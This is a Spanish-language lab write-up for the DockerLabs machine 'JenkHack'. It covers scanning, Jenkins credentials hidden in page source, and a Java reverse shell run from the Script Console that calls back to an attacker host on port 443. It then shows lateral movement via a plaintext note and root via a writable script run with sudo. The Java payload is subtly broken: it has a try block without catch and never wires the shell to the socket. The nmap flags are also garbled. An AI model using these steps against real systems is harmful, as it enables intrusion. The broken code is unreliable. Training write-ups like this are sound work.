# JenkHack — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 05/09/2024  
**Técnicas:** Jenkins · Reverse Shell · Java Shell · CyberChef · sudo abuse · Writable script

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Jenkins](#2-enumeración-web--jenkins)
3. [Acceso Jenkins — Script Console](#3-acceso-jenkins--script-console)
4. [Movimiento lateral — usuario jenkhack](#4-movimiento-lateral--usuario-jenkhack)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh jenkhack.tar
```

> IP asignada: `172.17.0.2`

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
80/tcp open  http
443/tcp open https
8080/tcp open http-proxy
```

El puerto `8080` corresponde a Jenkins.

---

## 2. Enumeración web — Jenkins

Exploramos los servicios web disponibles.

Encontramos un panel de login de Jenkins:

```text
http://172.17.0.2:8080
```

Inspeccionando el código fuente de la web encontramos posibles credenciales ocultas:

```html
<span hidden>jenkins_admin</span>
<span hidden>jenkhack.k!_sp4n</span>
```

Las utilizamos para autenticarnos en Jenkins.

---

## 3. Acceso Jenkins — Script Console

Una vez autenticados observamos que Jenkins tiene habilitada la **Script Console**.

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Generamos una reverse shell Java y la ejecutamos desde la consola.

Payload utilizado:

```java
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "192.168.1.26";
        int port = 443;
        String cmd = "bash";

        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
        }
    }
}
```

Obtenemos acceso remoto:

```bash
whoami
jenkins
```

---

## 4. Movimiento lateral — usuario jenkhack

Listamos usuarios:

```bash
ls -la /home/
```

Encontramos:

```text
jenkhack
```

Buscamos archivos relacionados:

```bash
find / -name "jenkhack" 2>/dev/null
```

Directorio encontrado:

```text
/var/www/jenkhack
```

Dentro existe:

```text
note.txt
```

Contenido:

```text
jenkhack:C1V9uLB8!'Ci*uDfP
```

El texto parece cifrado, por lo que utilizamos CyberChef para decodificarlo.

Herramienta utilizada:

[CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com)

Accedemos al usuario:

```bash
su jenkhack
```

Comprobamos sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/local/bin/bash
```

Al ejecutarlo observamos:

```text
Running command ... /opt/bash.sh
```

---

## 5. Escalada de privilegios

El script ejecutado es escribible.

Eliminamos el original:

```bash
rm /opt/bash.sh
```

Creamos uno nuevo:

```bash
#!/bin/bash
/bin/bash
```

Damos permisos:

```bash
chmod +x /opt/bash.sh
```

Ejecutamos el binario sudo:

```bash
sudo /usr/local/bin/bash
```

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Credenciales expuestas en HTML | Acceso Jenkins |
| Jenkins Script Console habilitada | Ejecución remota de comandos |
| Información sensible almacenada en texto plano | Movimiento lateral |
| Script ejecutado por sudo escribible | Escalada a root |

**Para defenderse:**

- No almacenar credenciales en el frontend.
- Restringir acceso a Jenkins Script Console.
- No guardar secretos en texto plano.
- Evitar scripts escribibles ejecutados como root.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
